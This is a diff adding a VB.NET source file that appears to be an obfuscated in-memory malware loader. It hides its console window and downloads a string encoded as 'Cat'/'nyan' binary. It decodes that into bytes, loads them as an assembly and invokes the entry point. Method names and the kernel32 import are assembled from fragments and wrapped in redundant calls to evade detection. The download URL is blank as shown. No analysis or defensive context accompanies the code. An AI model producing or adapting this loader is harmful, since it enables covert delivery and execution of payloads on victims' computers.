@@ -1,0 +1,75 @@
+Imports System.IO
+Imports System.Net
+Imports Microsoft.VisualBasic.CompilerServices
+
+Namespace Cmp
+    Friend Module nyan
+        <System.Runtime.InteropServices.DllImport("k" + "e" + "r" + "n" + "e" + "l" + "3" + "2." + "dl" + "l")>
+        Private Function GetConsoleWindow() As IntPtr
+        End Function
+        <System.Runtime.InteropServices.DllImport("user32.dll")>
+        Private Function ShowWindow(ByVal hWnd As IntPtr, ByVal nCmdShow As Integer) As Boolean
+        End Function
+        <STAThread()>
+        Public Sub Main()
+            Dim HBabkers As WebClient = New WebClient()
+            Dim HB As String = CStr(LateBinding.LateGet(HBabkers, Nothing, "DownloadString", {""}, Nothing, Nothing))
+            Dim Nyan01 As IntPtr = GetConsoleWindow()
+            ShowWindow(Nyan01, 0)
+            If Microsoft.VisualBasic.CompilerServices.Operators.CompareString(nyan.Cat.Cat05, "0.0", False) = 0 Then
+                nyan.Cat.nyanx.Add(HB)
+
+                Try
+                    System.Threading.Thread.Sleep(3000)
+                    Dim Nyan02 As List(Of String).Enumerator = nyan.Cat.nyanx.GetEnumerator()
+                    While Nyan02.MoveNext()
+                        Dim Nyan03 As String = Nyan02.Current
+                        nyan.Cat.Cat10 += Nyan03
+                    End While
+                Finally
+                    Dim Nyan04 As List(Of String).Enumerator
+                    CType(Nyan04, IDisposable).Dispose()
+                End Try
+            End If
+            If Microsoft.VisualBasic.CompilerServices.Operators.CompareString(nyan.Cat.Cat05, "0.0", False) = 0 Then
+                Dim Nyan05 As String = System.Text.RegularExpressions.Regex.Replace(nyan.Cat.Cat10.Replace("Cat", "0").Replace("nyan", "1"), "[^01]", "")
+                If Microsoft.VisualBasic.CompilerServices.Operators.CompareString(nyan.Cat.Cat05, "0.0", False) = 0 Then
+                    nyan.Cat.Cat04 = New Byte(CInt(Math.Round(CDbl(Nyan05.Length) / 8.0 - 1.0)) + 1 - 1) {}
+                    Dim Nyan06 As Integer = 0
+                    Dim Nyan07 As Integer = nyan.Cat.Cat04.Length - 1
+                    For Nyan08 As Integer = Nyan06 To Nyan07
+                        nyan.Cat.Cat04(Nyan08) = Convert.ToByte(Nyan05.Substring(Nyan08 * 8, 8), 2)
+                    Next
+                End If
+            End If
+            If Microsoft.VisualBasic.CompilerServices.Operators.CompareString(nyan.Cat.Cat05, "0.0", False) = 0 Then
+                nyan.Cat.Cat01 = System.Runtime.CompilerServices.RuntimeHelpers.GetObjectValue(System.Runtime.CompilerServices.RuntimeHelpers.GetObjectValue(System.Runtime.CompilerServices.RuntimeHelpers.GetObjectValue(System.Runtime.CompilerServices.RuntimeHelpers.GetObjectValue(System.Runtime.CompilerServices.RuntimeHelpers.GetObjectValue(System.Runtime.CompilerServices.RuntimeHelpers.GetObjectValue(System.Runtime.CompilerServices.RuntimeHelpers.GetObjectValue(Microsoft.VisualBasic.CompilerServices.Versioned.CallByName(System.Runtime.CompilerServices.RuntimeHelpers.GetObjectValue(System.Runtime.CompilerServices.RuntimeHelpers.GetObjectValue(System.Runtime.CompilerServices.RuntimeHelpers.GetObjectValue(System.Runtime.CompilerServices.RuntimeHelpers.GetObjectValue(System.Runtime.CompilerServices.RuntimeHelpers.GetObjectValue(System.Runtime.CompilerServices.RuntimeHelpers.GetObjectValue(System.Runtime.CompilerServices.RuntimeHelpers.GetObjectValue(nyan.Cat.Cat06))))))), nyan.Cat.Cat12, nyan.Cat.Cat07, New Object() {nyan.Cat.Cat04}))))))))
+            End If
+            If Microsoft.VisualBasic.CompilerServices.Operators.CompareString(nyan.Cat.Cat05, "0.0", False) = 0 Then
+                nyan.Cat.Cat02 = System.Runtime.CompilerServices.RuntimeHelpers.GetObjectValue(System.Runtime.CompilerServices.RuntimeHelpers.GetObjectValue(System.Runtime.CompilerServices.RuntimeHelpers.GetObjectValue(System.Runtime.CompilerServices.RuntimeHelpers.GetObjectValue(System.Runtime.CompilerServices.RuntimeHelpers.GetObjectValue(System.Runtime.CompilerServices.RuntimeHelpers.GetObjectValue(System.Runtime.CompilerServices.RuntimeHelpers.GetObjectValue(Microsoft.VisualBasic.CompilerServices.Versioned.CallByName(System.Runtime.CompilerServices.RuntimeHelpers.GetObjectValue(System.Runtime.CompilerServices.RuntimeHelpers.GetObjectValue(System.Runtime.CompilerServices.RuntimeHelpers.GetObjectValue(System.Runtime.CompilerServices.RuntimeHelpers.GetObjectValue(System.Runtime.CompilerServices.RuntimeHelpers.GetObjectValue(System.Runtime.CompilerServices.RuntimeHelpers.GetObjectValue(System.Runtime.CompilerServices.RuntimeHelpers.GetObjectValue(nyan.Cat.Cat01))))))), nyan.Cat.Cat14, nyan.Cat.Cat08, New Object(-1) {}))))))))
+            End If
+            If Microsoft.VisualBasic.CompilerServices.Operators.CompareString(nyan.Cat.Cat05, "0.0", False) = 0 Then
+                nyan.Cat.Cat03 = System.Runtime.CompilerServices.RuntimeHelpers.GetObjectValue(System.Runtime.CompilerServices.RuntimeHelpers.GetObjectValue(System.Runtime.CompilerServices.RuntimeHelpers.GetObjectValue(System.Runtime.CompilerServices.RuntimeHelpers.GetObjectValue(System.Runtime.CompilerServices.RuntimeHelpers.GetObjectValue(System.Runtime.CompilerServices.RuntimeHelpers.GetObjectValue(System.Runtime.CompilerServices.RuntimeHelpers.GetObjectValue(Microsoft.VisualBasic.CompilerServices.Versioned.CallByName(System.Runtime.CompilerServices.RuntimeHelpers.GetObjectValue(System.Runtime.CompilerServices.RuntimeHelpers.GetObjectValue(System.Runtime.CompilerServices.RuntimeHelpers.GetObjectValue(System.Runtime.CompilerServices.RuntimeHelpers.GetObjectValue(System.Runtime.CompilerServices.RuntimeHelpers.GetObjectValue(System.Runtime.CompilerServices.RuntimeHelpers.GetObjectValue(System.Runtime.CompilerServices.RuntimeHelpers.GetObjectValue(nyan.Cat.Cat02))))))), nyan.Cat.Cat13, nyan.Cat.Cat07, New Object() {System.Runtime.CompilerServices.RuntimeHelpers.GetObjectValue(System.Runtime.CompilerServices.RuntimeHelpers.GetObjectValue(System.Runtime.CompilerServices.RuntimeHelpers.GetObjectValue(nyan.Cat.Cat15))), System.Runtime.CompilerServices.RuntimeHelpers.GetObjectValue(System.Runtime.CompilerServices.RuntimeHelpers.GetObjectValue(System.Runtime.CompilerServices.RuntimeHelpers.GetObjectValue(nyan.Cat.Cat16)))}))))))))
+            End If
+        End Sub 'Set
+        Public Structure Cat
+            Public Shared Cat01 As Object = Nothing
+            Public Shared Cat02 As Object = Nothing
+            Public Shared Cat03 As Object = Nothing
+            Public Shared Cat04 As Byte() = Nothing
+            Public Shared Cat05 As String = "0.0"
+            Public Shared Cat06 As Object = AppDomain.CurrentDomain
+            Public Shared Cat07 As CallType = CallType.Method
+            Public Shared Cat08 As CallType = CallType.[Get]
+            Public Shared Cat09 As Object = String.Empty
+            Public Shared Cat10 As String = String.Empty
+            Public Shared nyanx As List(Of String) = New List(Of String)()
+            Public Shared Cat11 As Object = Nothing
+            Public Shared Cat12 As String = "[0][1][2][3]".Replace("[0]", "L").Replace("[1]", "o").Replace("[2]", "a").Replace("[3]", "d")
+            Public Shared Cat13 As String = "[0][1][2][3][4][5]".Replace("[0]", "I").Replace("[1]", "n").Replace("[2]", "v").Replace("[3]", "o").Replace("[4]", "k").Replace("[5]", "e")
+            Public Shared Cat14 As String = "[0][1][2][3][4][5][6][7][8][9]".Replace("[0]", "E").Replace("[1]", "n").Replace("[2]", "t").Replace("[3]", "r").Replace("[4]", "y").Replace("[5]", "P").Replace("[6]", "o").Replace("[7]", "i").Replace("[8]", "n").Replace("[9]", "t")
+            Public Shared Cat15 As Object = New Object() {System.Runtime.CompilerServices.RuntimeHelpers.GetObjectValue(System.Runtime.CompilerServices.RuntimeHelpers.GetObjectValue(System.Runtime.CompilerServices.RuntimeHelpers.GetObjectValue(System.Runtime.CompilerServices.RuntimeHelpers.GetObjectValue(System.Runtime.CompilerServices.RuntimeHelpers.GetObjectValue(System.Runtime.CompilerServices.RuntimeHelpers.GetObjectValue(System.Runtime.CompilerServices.RuntimeHelpers.GetObjectValue(nyan.Cat.Cat09)))))))}
+            Public Shared Cat16 As Object = System.Runtime.CompilerServices.RuntimeHelpers.GetObjectValue(System.Runtime.CompilerServices.RuntimeHelpers.GetObjectValue(System.Runtime.CompilerServices.RuntimeHelpers.GetObjectValue(System.Runtime.CompilerServices.RuntimeHelpers.GetObjectValue(System.Runtime.CompilerServices.RuntimeHelpers.GetObjectValue(System.Runtime.CompilerServices.RuntimeHelpers.GetObjectValue(System.Runtime.CompilerServices.RuntimeHelpers.GetObjectValue(nyan.Cat.Cat11)))))))
+        End Structure
+    End Module
+End Namespace
